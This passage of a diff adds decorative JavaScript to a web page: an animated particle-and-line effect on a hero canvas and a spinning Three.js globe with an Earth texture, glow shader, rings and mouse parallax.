+    let w, h, particles = [], mouse = { x: -9999, y: -9999 }, animating = true;
+
+    function resize() {
+      const rect = hero.getBoundingClientRect();
+      w = canvas.width = rect.width;
+      h = canvas.height = rect.height;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    // Create particles
+    const COUNT = 90;
+    for (let i = 0; i < COUNT; i++) {
+      particles.push({
+        x: Math.random() * w,
+        y: Math.random() * h,
+        vx: (Math.random() - 0.5) * 0.4,
+        vy: (Math.random() - 0.5) * 0.4,
+        r: Math.random() * 2.5 + 1.0
+      });
+    }
+
+    // Floating line segments (decorative, drift around edges)
+    var lines = [];
+    var LINE_COUNT = 24;
+    for (var li = 0; li < LINE_COUNT; li++) {
+      var angle = Math.random() * Math.PI * 2;
+      var len = 80 + Math.random() * 160;
+      var cx = Math.random() * w;
+      var cy = Math.random() * h;
+      lines.push({
+        cx: cx, cy: cy,
+        angle: angle,
+        len: len,
+        va: (Math.random() - 0.5) * 0.003,
+        vx: (Math.random() - 0.5) * 0.3,
+        vy: (Math.random() - 0.5) * 0.3,
+        baseAlpha: 0.1 + Math.random() * 0.15
+      });
+    }
+
+    // Mouse tracking (relative to hero)
+    hero.addEventListener('mousemove', function(e) {
+      const rect = hero.getBoundingClientRect();
+      mouse.x = e.clientX - rect.left;
+      mouse.y = e.clientY - rect.top;
+    });
+    hero.addEventListener('mouseleave', function() {
+      mouse.x = -9999;
+      mouse.y = -9999;
+    });
+
+    // Pause when off-screen
+    const plexusObs = new IntersectionObserver(function(entries) {
+      animating = entries[0].isIntersecting;
+    }, { threshold: 0.05 });
+    plexusObs.observe(hero);
+
+    function dist(a, b) {
+      const dx = a.x - b.x, dy = a.y - b.y;
+      return Math.sqrt(dx * dx + dy * dy);
+    }
+
+    function draw() {
+      requestAnimationFrame(draw);
+      if (!animating) return;
+
+      ctx.clearRect(0, 0, w, h);
+
+      // Update particles
+      for (let i = 0; i < COUNT; i++) {
+        const p = particles[i];
+        p.x += p.vx;
+        p.y += p.vy;
+        if (p.x < 0) p.x = w;
+        if (p.x > w) p.x = 0;
+        if (p.y < 0) p.y = h;
+        if (p.y > h) p.y = 0;
+      }
+
+      // Draw connections
+      const linkDist = 160;
+      const mouseDist = 260;
+      for (let i = 0; i < COUNT; i++) {
+        for (let j = i + 1; j < COUNT; j++) {
+          const d = dist(particles[i], particles[j]);
+          if (d < linkDist) {
+            const alpha = (1 - d / linkDist) * 0.25;
+            ctx.strokeStyle = 'rgba(255,255,255,' + alpha + ')';
+            ctx.lineWidth = 0.8;
+            ctx.beginPath();
+            ctx.moveTo(particles[i].x, particles[i].y);
+            ctx.lineTo(particles[j].x, particles[j].y);
+            ctx.stroke();
+          }
+        }
+        // Mouse connections
+        const dm = dist(particles[i], mouse);
+        if (dm < mouseDist) {
+          const alpha = (1 - dm / mouseDist) * 0.45;
+          ctx.strokeStyle = 'rgba(255,255,255,' + alpha + ')';
+          ctx.lineWidth = 1.2;
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(mouse.x, mouse.y);
+          ctx.stroke();
+        }
+      }
+
+      // Draw floating line segments
+      for (var li = 0; li < LINE_COUNT; li++) {
+        var ln = lines[li];
+        ln.cx += ln.vx;
+        ln.cy += ln.vy;
+        ln.angle += ln.va;
+        // Wrap
+        if (ln.cx < -100) ln.cx = w + 100;
+        if (ln.cx > w + 100) ln.cx = -100;
+        if (ln.cy < -100) ln.cy = h + 100;
+        if (ln.cy > h + 100) ln.cy = -100;
+
+        var halfLen = ln.len / 2;
+        var x1 = ln.cx + Math.cos(ln.angle) * halfLen;
+        var y1 = ln.cy + Math.sin(ln.angle) * halfLen;
+        var x2 = ln.cx - Math.cos(ln.angle) * halfLen;
+        var y2 = ln.cy - Math.sin(ln.angle) * halfLen;
+
+        // Mouse interaction: brighten + attract when close
+        var dmLine = dist(ln, mouse);
+        var lineAlpha = ln.baseAlpha;
+        if (dmLine < 300) {
+          lineAlpha += (1 - dmLine / 300) * 0.35;
+          // Subtle attraction
+          ln.cx += (mouse.x - ln.cx) * 0.003;
+          ln.cy += (mouse.y - ln.cy) * 0.003;
+        }
+
+        ctx.strokeStyle = 'rgba(255,255,255,' + lineAlpha + ')';
+        ctx.lineWidth = 1.5;
+        ctx.beginPath();
+        ctx.moveTo(x1, y1);
+        ctx.lineTo(x2, y2);
+        ctx.stroke();
+
+        // Connect line endpoints to nearby particles
+        for (var pi = 0; pi < COUNT; pi++) {
+          var dp1 = dist(particles[pi], {x: x1, y: y1});
+          if (dp1 < 150) {
+            var a = (1 - dp1 / 150) * 0.12;
+            ctx.strokeStyle = 'rgba(255,255,255,' + a + ')';
+            ctx.lineWidth = 0.6;
+            ctx.beginPath();
+            ctx.moveTo(x1, y1);
+            ctx.lineTo(particles[pi].x, particles[pi].y);
+            ctx.stroke();
+          }
+        }
+      }
+
+      // Draw particles
+      for (let i = 0; i < COUNT; i++) {
+        const p = particles[i];
+        ctx.fillStyle = 'rgba(255,255,255,0.75)';
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+    draw();
+  })();
+  </script>
+
+  <!-- THREE.JS SPINNING GLOBE WITH EARTH MAP -->
+  <script>
+  (function() {
+    const canvas = document.getElementById('globe-canvas');
+    if (!canvas || typeof THREE === 'undefined') return;
+    const hero = canvas.closest('.hero');
+    let animating = true;
+    let mouseNorm = { x: 0, y: 0 };
+
+    // Scene setup
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(45, 1, 0.1, 1000);
+    camera.position.z = 4;
+
+    const renderer = new THREE.WebGLRenderer({ canvas: canvas, alpha: true, antialias: true });
+    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+    renderer.setClearColor(0x000000, 0);
+
+    function resize() {
+      const rect = hero.getBoundingClientRect();
+      renderer.setSize(rect.width, rect.height);
+      camera.aspect = rect.width / rect.height;
+      camera.updateProjectionMatrix();
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    // Globe group
+    const globeGroup = new THREE.Group();
+    scene.add(globeGroup);
+
+    // Load Earth texture (dark map — white/gray continents on dark ocean)
+    const loader = new THREE.TextureLoader();
+    const earthTexture = loader.load('https://unpkg.com/three-globe@2.45.0/example/img/earth-dark.jpg');
+    const topoTexture = loader.load('https://unpkg.com/three-globe@2.45.0/example/img/earth-topology.png');
+
+    // Main Earth sphere with texture
+    const earthGeo = new THREE.SphereGeometry(1.0, 64, 64);
+    const earthMat = new THREE.MeshBasicMaterial({
+      map: earthTexture,
+      transparent: true,
+      opacity: 1.0,
+      color: 0xffffff
+    });
+    const earthMesh = new THREE.Mesh(earthGeo, earthMat);
+    globeGroup.add(earthMesh);
+
+    // Wireframe overlay for tech/futuristic feel
+    const wireGeo = new THREE.SphereGeometry(1.003, 48, 24);
+    const wireMat = new THREE.MeshBasicMaterial({
+      color: 0xffffff,
+      wireframe: true,
+      transparent: true,
+      opacity: 0.1
+    });
+    const wireSphere = new THREE.Mesh(wireGeo, wireMat);
+    globeGroup.add(wireSphere);
+
+    // Atmosphere glow shell (custom shader for rim glow)
+    const atmosGeo = new THREE.SphereGeometry(1.12, 64, 64);
+    const atmosMat = new THREE.ShaderMaterial({
+      vertexShader: [
+        'varying vec3 vNormal;',
+        'void main() {',
+        '  vNormal = normalize(normalMatrix * normal);',
+        '  gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);',
+        '}'
+      ].join('\n'),
+      fragmentShader: [
+        'varying vec3 vNormal;',
+        'void main() {',
+        '  float intensity = pow(0.65 - dot(vNormal, vec3(0.0, 0.0, 1.0)), 2.0);',
+        '  gl_FragColor = vec4(0.85, 0.9, 1.0, 1.0) * intensity * 0.7;',
+        '}'
+      ].join('\n'),
+      blending: THREE.AdditiveBlending,
+      side: THREE.BackSide,
+      transparent: true
+    });
+    const atmosMesh = new THREE.Mesh(atmosGeo, atmosMat);
+    globeGroup.add(atmosMesh);
+
+    // Equator ring
+    const ringGeo = new THREE.RingGeometry(1.04, 1.06, 128);
+    const ringMat = new THREE.MeshBasicMaterial({
+      color: 0xffffff,
+      transparent: true,
+      opacity: 0.07,
+      side: THREE.DoubleSide
+    });
+    const ring = new THREE.Mesh(ringGeo, ringMat);
+    ring.rotation.x = Math.PI / 2;
+    globeGroup.add(ring);
+
+    // Second tilted ring for futuristic look
+    const ring2Geo = new THREE.RingGeometry(1.12, 1.13, 128);
+    const ring2Mat = new THREE.MeshBasicMaterial({
+      color: 0xffffff,
+      transparent: true,
+      opacity: 0.04,
+      side: THREE.DoubleSide
+    });
+    const ring2 = new THREE.Mesh(ring2Geo, ring2Mat);
+    ring2.rotation.x = Math.PI / 2.5;
+    ring2.rotation.z = 0.3;
+    globeGroup.add(ring2);
+
+    // Mouse tracking for parallax
+    hero.addEventListener('mousemove', function(e) {
+      const rect = hero.getBoundingClientRect();
+      mouseNorm.x = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
+      mouseNorm.y = ((e.clientY - rect.top) / rect.height - 0.5) * 2;
+    });
+
+    // Pause when off-screen
+    const globeObs = new IntersectionObserver(function(entries) {
+      animating = entries[0].isIntersecting;
+    }, { threshold: 0.05 });
+    globeObs.observe(hero);
+
+    // Tilt globe slightly for nicer angle
+    globeGroup.rotation.x = 0.3;
+    globeGroup.rotation.z = -0.1;
+
+    function animate() {
+      requestAnimationFrame(animate);
+      if (!animating) return;
+
+      // Auto-rotate (slow)
+      globeGroup.rotation.y += 0.0015;
+
+      // Mouse parallax (subtle)
+      const targetX = 0.3 + mouseNorm.y * 0.08;
+      const targetZ = -0.1 + mouseNorm.x * 0.08;
+      globeGroup.rotation.x += (targetX - globeGroup.rotation.x) * 0.03;
+      globeGroup.rotation.z += (targetZ - globeGroup.rotation.z) * 0.03;
+
+      renderer.render(scene, camera);
+    }
+    animate();
+  })();
+  </script>
+
+</body>
+</html>
